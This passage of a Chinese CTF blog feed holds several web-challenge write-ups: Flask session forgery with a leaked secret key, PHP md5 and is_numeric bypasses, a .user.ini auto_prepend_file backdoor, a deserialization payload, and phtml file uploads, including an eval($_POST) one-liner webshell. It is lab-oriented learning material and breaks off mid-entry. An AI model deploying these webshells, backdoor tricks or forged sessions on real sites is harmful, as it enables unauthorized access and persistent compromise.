    <content type="html"><![CDATA[<h1>[HCTF 2018]admin</h1><h2 id="0x00-过程">0x00 过程</h2><p>发现登录和注册界面，先注册一个用户：</p><p><img src="/2022/10/23/[HCTF-2018]admin/image-20221023125710050.png" alt></p><p>登录后发现cookie里存在session，好像是jwt，但是解码后发现不是。</p><p><img src="/2022/10/23/[HCTF-2018]admin/image-20221023125736863.png" alt></p><p>发现有post和更改密码的功能，post测试后发现无xss，更改密码功能是根据加密的session来提交，无法越权。</p><p>但在查看密码页面中发现了github地址：<a href="https://github.com/woadsl1234/hctf_flask">https://github.com/woadsl1234/hctf_flask</a></p><p><img src="/2022/10/23/[HCTF-2018]admin/image-20221023125904442.png" alt></p><p>然后发现这道题应该不是逻辑题的思路……通过审查源码发现该站是flask，可以通过伪造session进入admin，翻看文件发现<code>secret_key</code>:ckj123。</p><p><img src="/2022/10/23/[HCTF-2018]admin/image-20221023130032341.png" alt></p><h2 id="0x01-flask-session">0x01 flask session</h2><p><strong>将session存储在客户端cookie中，最重要的就是解决session不能被篡改的问题。</strong></p><blockquote><p>由于 flask 是非常轻量级的 Web框架 ，其 session 存储在客户端中（可以通过HTTP请求头Cookie字段的session获取），且仅对 session 进行了签名，缺少数据防篡改实现，这便很容易存在安全漏洞。</p></blockquote><h3 id="flask-session-分析">flask session 分析</h3><p>flask对session的处理位于flask/sessions.py中，默认情况下flask的session以cookie的形式保存于客户端，利用签名机制来防止数据被篡改。</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">.eJxF<span class="hljs-number">0</span>EFr<span class="hljs-name">g0</span>AUBOC_Ut<span class="hljs-number">45</span>h<span class="hljs-number">3</span>X<span class="hljs-attr">VSyCHwm7</span>Ew<span class="hljs-number">1</span>vZsFF<span class="hljs-number">8</span>l<span class="hljs-number">5</span>Ba<span class="hljs-meta">o67</span>dF<span class="hljs-symbol">NSwiSH_vSaF9</span>jzwDT<span class="hljs-symbol">N3</span>OJyGemxhPQ<span class="hljs-number">2</span>XegWH<span class="hljs-number">7</span>hPWd<span class="hljs-number">3</span>j<span class="hljs-number">7</span>gDVkibIllwxF<span class="hljs-number">6</span>tWc<span class="hljs-number">3</span>lAgLy<span class="hljs-number">05</span>MmVIxa<span class="hljs-number">4</span><span class="hljs-symbol">nJz3</span>Z<span class="hljs-attr">vSenQxIyxCRv1</span>SwjJVKm<span class="hljs-symbol">nLyi1</span>TGZXZeZPsK<span class="hljs-number">5</span>iVUifVZgW<span class="hljs-symbol">Nq8</span>J<span class="hljs-number">7</span>Fr<span class="hljs-number">0</span>ciYitwp-z<span class="hljs-number">6</span>XVrL<span class="hljs-name">M4</span>A<span class="hljs-number">35</span>Pij<span class="hljs-symbol">NdnHQq0</span>JeyTaR<span class="hljs-number">4</span>rlDUQWY<span class="hljs-number">7</span>Fkm<span class="hljs-symbol">NFOmmrFIryS2</span>_WJZtOkGHiuoxuF<span class="hljs-number">0</span>mL<span class="hljs-number">77</span>-vw_YeHR<span class="hljs-number">6</span>RvOmiHXESU<span class="hljs-number">6</span>VoZaEhW<span class="hljs-symbol">nJ2</span>EaT<span class="hljs-number">4</span><span class="hljs-symbol">n6</span>WuoCxZ_<span class="hljs-number">1</span>qiubzYvr<span class="hljs-number">3</span>LGp_yRyk<span class="hljs-number">9</span>b-<span class="hljs-symbol">Nzkf3</span>RLAVI<span class="hljs-number">8</span>TrOAy<span class="hljs-number">1</span>sPr<span class="hljs-symbol">NggYPH4</span>A<span class="hljs-number">7</span>tpryw.Y<span class="hljs-number">1</span>TA<span class="hljs-number">4</span>A.PGk<span class="hljs-number">6</span>Dl<span class="hljs-number">2</span>hS<span class="hljs-meta">o1</span>v<span class="hljs-number">5</span>A<span class="hljs-number">72</span>lIsxPaXJJ<span class="hljs-number">3</span>k<br></code></pre></td></tr></table></figure><ul><li>通过.隔开的3段内容，第一段其实就是base64 encode后的内容，但去掉了填充用的等号，若decode失败，自己需要补上1-3个等号补全。中间内容为时间戳，在flask中时间戳若超过31天则视为无效。最后一段则是安全签名，将sessiondata,时间戳，和flask的secretkey通过sha1运算的结果。</li></ul><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">json</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">zlib</span>-&gt;</span>base64后的源字符串 . 时间戳 . hmac签名信息<br></code></pre></td></tr></table></figure><ul><li>服务端每次收到cookie后，会将cookie中前两段取出和secretkey做sha1运算，若结果与cookie第三段不一致则视为无效。</li><li>从cookie获取session的过程便是验证签名-&gt;验证是否过期-&gt;解码。</li></ul><h3 id="漏洞成因">漏洞成因</h3><p>漏洞的根源是secretkey被获取，应当使用完全随机的secretkey，或在clone某项目后修改为随机的key。</p><p><strong>需要特别注意的是python2与python3下产生的timestamp是不一样的！！</strong></p><h3 id="利用工具：">利用工具：</h3><ul><li>网址：（<a href="https://github.com/noraj/flask-session-cookie-manager%EF%BC%89">https://github.com/noraj/flask-session-cookie-manager）</a></li><li>通过上述脚本解密处 session ，我们就可以大概知道 session 中存储着哪些基本信息。然后我们可以通过其他漏洞获取用于签名认证的 secret_key ，进而伪造任意用户身份，扩大攻击效果。</li></ul><h2 id="0x02-利用">0x02 利用</h2><p>下载<code>flask-session-cookie-manager</code>，已知<code>secret</code>为<code>ckj123</code>，当前session为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">.eJxF0EFrg0AUBOC_Ut45h3XVSyCHwm7Ew1vZsFF8l5Bao67dFNSwiSH_vSaF9jzwDTN3OJyGemxhPQ2XegWH7hPWd3j7gDVkibIllwxF6tWc3lAgLy05MmVIxa4nJz3ZvSenQxIyxCRv1SwjJVKmnLyi1TGZXZeZPsK5iVUifVZgWNq8J7Fr0ciYitwp-z6XVrLM4A35PijNdnHQq0JeyTaR4rlDUQWY7FkmNFOmmrFIryS2_WJZtOkGHiuoxuF0mL77-vw_YeHR6RvOmiHXESU6VoZaEhWnJ2EaT4n6WuoCxZ_1qiubzYvr3LGp_yRyk9b-Nzkf3RLAVI8TrOAy1sPrNggYPH4A7tpryw.Y1TA4A.PGk6Dl2hSo1v5A72lIsxPaXJJ3k<br></code></pre></td></tr></table></figure><p>使用工具解密session，然后将session里的test用户替换成admin：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">shell&gt; python flask_session_cookie_manager3.py decode -s ckj123 -c .eJxF0EFrg0AUBOC_Ut45h3XVSyCHwm7Ew1vZsFF8l5Bao67dFNSwiSH_vSaF9jzwDTN3OJyGemxhPQ2XegWH7hPWd3j7gDVkibIllwxF6tWc3lAgLy05MmVIxa4nJz3ZvSenQxIyxCRv1SwjJVKmnLyi1TGZXZeZPsK5iVUifVZgWNq8J7Fr0ciYitwp-z6XVrLM4A35PijNdnHQq0JeyTaR4rlDUQWY7FkmNFOmmrFIryS2_WJZtOkGHiuoxuF0mL77-vw_YeHR6RvOmiHXESU6VoZaEhWnJ2EaT4n6WuoCxZ_1qiubzYvr3LGp_yRyk9b-Nzkf3RLAVI8TrOAy1sPrNggYPH4A7tpryw.Y1TA4A.PGk6Dl2hSo1v5A72lIsxPaXJJ3k<br><br>&#123;<span class="hljs-string">&#x27;_fresh&#x27;</span>: True, <span class="hljs-string">&#x27;_id&#x27;</span>: b<span class="hljs-string">&#x27;8ccca4020722036b6fe67eddfa0f50fd7d170ea7184246a1249e4b9983894a09c7b5dd4a119eef603b149323e5a1a7305a1f887ef0750e48445731b1d1db5c22&#x27;</span>, <span class="hljs-string">&#x27;csrf_token&#x27;</span>: b<span class="hljs-string">&#x27;9ef2d23443d8dd956ad76eb1e80dce7357c23cbb&#x27;</span>, <span class="hljs-string">&#x27;image&#x27;</span>: b<span class="hljs-string">&#x27;fkPC&#x27;</span>, <span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;user_id&#x27;</span>: <span class="hljs-string">&#x27;10&#x27;</span>&#125;<br><br>shell&gt; python flask_session_cookie_manager3.py encode -s ckj123 -t <span class="hljs-string">&quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;8ccca4020722036b6fe67eddfa0f50fd7d170ea7184246a1249e4b9983894a09c7b5dd4a119eef603b149323e5a1a7305a1f887ef0750e48445731b1d1db5c22&#x27;, &#x27;csrf_token&#x27;: b&#x27;9ef2d23443d8dd956ad76eb1e80dce7357c23cbb&#x27;, &#x27;image&#x27;: b&#x27;fkPC&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot;</span><br><br>.eJxF0EGLwjAUBOC_sryzhzRtL4KHhWRLDy8lElvyLuLW2jbduFCVaMX_vtWF3fPAN8zcYXsYm1MHy_N4aRaw7fewvMPbJyyhyJSzXDIUeVBTfkOB3DryZGxM1XogLwO5TSCvYxIyxqzs1CQTJXKmvLyi0ymZdV-YIcGpTVUmQ1FhbF05kFh3aGRKVemVe5-sk6wweEO-iaz5mB0MqpJXcm2ieOlR1BFmG1YIzZSpJ6zyK4mPYbYcunwFjwXUp_GwPX8PzfF_wsyj1zecNEOuE8p0qgx1JGpOT8K0gTL1NddFij_rVW_b1Yvr_a5t_iTyZ63Db3Lc-TmA3d73R1jA5dSMr98gYvD4AVqXbBQ.Y1TEoA.cNNCikWfk8OnehmanfDY5GMaznk<br></code></pre></td></tr></table></figure><p>将session替换即可getflag：</p><p><img src="/2022/10/23/[HCTF-2018]admin/image-20221023130435436.png" alt></p><h2 id="0x03-参考">0x03 参考</h2><p><a href="https://blog.csdn.net/weixin_44190459/article/details/116774912">flask框架漏洞_JJT_with_hair的博客-CSDN博客_flask漏洞</a></p><p><a href="https://blog.csdn.net/qq_45615127/article/details/117150993">Flask之session伪造_HackerTenG的博客-CSDN博客_flask session伪造</a></p><p><a href="https://github.com/noraj/flask-session-cookie-manager">noraj/flask-session-cookie-manager: Flask Session Cookie Decoder/Encoder (github.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>CTF</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>学习</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MRCTF2020_Ez_bypass</title>
    <link href="/2022/10/23/%5BMRCTF2020%5DEz_bypass/"/>
    <url>/2022/10/23/%5BMRCTF2020%5DEz_bypass/</url>
    
    <content type="html"><![CDATA[<h1>[MRCTF2020]Ez_bypass</h1><h2 id="0x00-过程">0x00 过程</h2><p>进页面看到审计代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//I put something in F12 for you</span><br><span class="hljs-comment">//include &#x27;flag.php&#x27;;</span><br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>    <span class="hljs-variable">$gg</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$id</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$gg</span>) &amp;&amp; <span class="hljs-variable">$id</span> !== <span class="hljs-variable">$gg</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You got the first step&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$passwd</span>))<br>            &#123;<br>                 <span class="hljs-keyword">if</span>(<span class="hljs-variable">$passwd</span>==<span class="hljs-number">1234567</span>)<br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Good Job!&#x27;</span>;<br>                     <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>                     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;By Retr_0&#x27;</span>);<br>                 &#125;<br>                 <span class="hljs-keyword">else</span><br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;can you think twice??&quot;</span>;<br>                 &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You can not get it !&#x27;</span>;<br>            &#125;<br><br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;only one way to get the flag&#x27;</span>);<br>        &#125;<br>&#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are not a real hacker!&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Please input first&#x27;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先判断传入的id和gg的md5是否相同，且id与gg本身不同。一个办法是找存在哈希碰撞的两个字符串，还有一个方法就是直接让gg与id变成数组，因为md5无法让数组哈希，所以由于php弱类型会让判断成立，绕过第一个门槛；第二个门槛则还是<code>is_numeric</code>绕过，以post形式提交<code>passwd=1234567%00</code>，即可绕过之后的判断，拿到flag。</p><p><img src="/2022/10/23/[MRCTF2020]Ez_bypass/image-20221023165211517.png" alt></p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>CTF</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>学习</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SUCTF_2019_CheckIn</title>
    <link href="/2022/10/23/%5BSUCTF-2019%5DCheckIn/"/>
    <url>/2022/10/23/%5BSUCTF-2019%5DCheckIn/</url>
    
    <content type="html"><![CDATA[<h1>[SUCTF-2019]CheckIn</h1><h2 id="0x00-背景">0x00 背景</h2><p>这个估计很多同学看了不屑，认为是烂大街的东西了：</p><p><a href="http://zone.wooyun.org/content/16114">.htaccess文件构成的PHP后门</a></p><p>那么我来个新的吧：<code>.user.ini</code>。它比<code>.htaccess</code>用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。我的nginx服务器全部是fpm/fastcgi，我的IIS php5.3以上的全部用的fastcgi/cgi，我win下的apache上也用的fcgi，可谓很广，不像.htaccess有局限性。</p><h2 id="0x01-user-ini">0x01 .user.ini</h2><p>那么什么是.user.ini？</p><p>这得从php.ini说起了。php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：<code>PHP_INI_SYSTEM</code>、<code>PHP_INI_PERDIR</code>、<code>PHP_INI_ALL</code>、<code>PHP_INI_USER</code>。 在此可以查看：<a href="http://php.net/manual/zh/ini.list.php">http://php.net/manual/zh/ini.list.php</a> 这几种模式有什么区别？看看官方的解释：</p><p><img src="/2022/10/23/[SUCTF-2019]CheckIn/2014103002272568560.png" alt="enter image description here"></p><p>其中就提到了，模式为PHP_INI_USER的配置项，可以在ini_set()函数中设置、注册表中设置，再就是.user.ini中设置。 这里就提到了.user.ini，那么这是个什么配置文件？那么官方文档在<a href="http://php.net/manual/zh/configuration.file.per-user.php">这里</a>又解释了：</p><p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER['DOCUMENT_ROOT']</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p><p>在 <code>.user.ini</code> 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p><p>这里就很清楚了，<code>.user.ini</code>实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置）</p><p>实际上，除了<code>PHP_INI_SYSTEM</code>以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。</p><p>而且，和<code>php.ini</code>不同的是，<code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p><p>然后我们看到php.ini中的配置项，可惜我沮丧地发现，只要稍微敏感的配置项，都是<code>PHP_INI_SYSTEM</code>模式的（甚至是php.ini only的），包括<code>disable_functions</code>、<code>extension_dir</code>、<code>enable_dl</code>等。 不过，我们可以很容易地借助<code>.user.ini</code>文件来构造一个“后门”。</p><p>Php配置项中有两个比较有意思的项（下图第一、四个）：</p><p><img src="/2022/10/23/[SUCTF-2019]CheckIn/2014103002272554789.png" alt="enter image description here"></p><p><code>auto_append_file</code>、<code>auto_prepend_file</code>，点开看看什么意思：</p><p><img src="/2022/10/23/[SUCTF-2019]CheckIn/2014103002272569525.png" alt="enter image description here"></p><p>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">auto_prepend_file</span>=<span class="hljs-number">01</span>.gif<br></code></pre></td></tr></table></figure><p>01.gif是要包含的文件。</p><p>所以，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。</p><p>测试一下，我分别在IIS6.0+Fastcgi+PHP5.3和nginx+fpm+php5.3上测试。 目录下有.user.ini，和包含webshell的01.gif，和正常php文件echo.php：</p><p><img src="/2022/10/23/[SUCTF-2019]CheckIn/2014103002272563350.png" alt="enter image description here"></p><p><img src="/2022/10/23/[SUCTF-2019]CheckIn/2014103002272650870.png" alt="enter image description here"></p><p>访问echo.php即可看到后门：</p><p><img src="/2022/10/23/[SUCTF-2019]CheckIn/2014103002272652570.png" alt="enter image description here"></p><p>Nginx下同样：</p><p><img src="/2022/10/23/[SUCTF-2019]CheckIn/2014103002272682946.png" alt="enter image description here"></p><p><img src="/2022/10/23/[SUCTF-2019]CheckIn/2014103002272674827.png" alt="enter image description here"></p><p>那么，我们可以猥琐地想一下，在哪些情况下可以用到这个姿势？ 比如，某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。 再比如，你只是想隐藏个后门，这个方式是最方便的。</p><h2 id="0x02-过程">0x02 过程</h2><p>先传<code>.user.ini</code>文件：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini">GIF89a<br><span class="hljs-attr">auto_prepend_file</span>=<span class="hljs-number">1</span>.png<br></code></pre></td></tr></table></figure><p>再传phtml马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF98a<br>&lt;script language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>之后拿shell。</p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>CTF</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>学习</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ZJCTF2019_NiZhuanSiWei</title>
    <link href="/2022/10/23/%5BZJCTF%202019%5DNiZhuanSiWei/"/>
    <url>/2022/10/23/%5BZJCTF%202019%5DNiZhuanSiWei/</url>
    
    <content type="html"><![CDATA[<h1>[ZJCTF-2019]NiZhuanSiWei</h1><h2 id="0x00-过程">0x00 过程</h2><p>进入主页发现php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;password&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>(); <br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//useless.php</span><br>        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$password</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$password</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>首先检测传入参数是否有text，如果有就读text，判断是否等于<code>welcome to the zjctf</code>。先过这个判断，首先在vps起个web服务，主页就设置成判断的字符串，即可绕过：</p><p><img src="/2022/10/23/[ZJCTF%202019]NiZhuanSiWei/image-20221023155137386.png" alt></p><p>进入下面的判断，首先正则匹配flag，如果匹配到了则返回警告信息。否则就包含文件。这里注释了<code>useless.php</code>，提示要包含它，但是包含后页面无回显，说明文件里都是php代码，使用<code>php://filter</code>转base64输出后解码：</p><p><img src="/2022/10/23/[ZJCTF%202019]NiZhuanSiWei/image-20221023155310511.png" alt></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file); <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure><p>得到一个Flag类，且有<code>__tostring</code>魔术方法，正好可以和之前的<code>password</code>反序列化结合利用。此处将<code>O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code>传入password即可得到flag：</p><p><img src="/2022/10/23/[ZJCTF%202019]NiZhuanSiWei/image-20221023160222342.png" alt></p><h2 id="0x01-参考">0x01 参考</h2><p><a href="https://blog.csdn.net/LJH1999ZN/article/details/123338591">(32条消息) 反序列化漏洞详解_一句话木马的博客-CSDN博客_反序列化漏洞</a></p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>CTF</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>学习</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>极客大挑战_2019_Upload1</title>
    <link href="/2022/10/23/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DUpload1/"/>
    <url>/2022/10/23/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DUpload1/</url>
    
    <content type="html"><![CDATA[<h1>[极客大挑战-2019]Upload1</h1><h2 id="0x00-过程">0x00 过程</h2><p>进题目看到一个上传点：</p><p><img src="/2022/10/23/[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Upload1/image-20221022192743910.png" alt></p><p>查看源代码之后没有信息，上传图片截取个正常的数据包看看：</p><p><img src="/2022/10/23/[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Upload1/image-20221022192830206.png" alt></p><p>清除文件数据，随手补个gif文件头，但是后缀名改成php，发现上传失败：</p><p><img src="/2022/10/23/[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Upload1/image-20221022192926187.png" alt></p><p>试了下phtml后缀名，发现没有做过滤：</p><p><img src="/2022/10/23/[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Upload1/image-20221022193028733.png" alt></p><p>写个一句话的phtml，上传成功没有拦截：</p><p><img src="/2022/10/23/[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Upload1/image-20221022193040857.png" alt></p><p>shell上传成功，可以执行命令：</p><p><img src="/2022/10/23/[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Upload1/image-20221022193144968.png" alt></p><p>逐层ls，发现flag在根目录下，cat文件拿到flag：</p><p><img src="/2022/10/23/[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Upload1/image-20221022193253123.png" alt></p><h2 id="0x01-参考">0x01 参考</h2><p><a 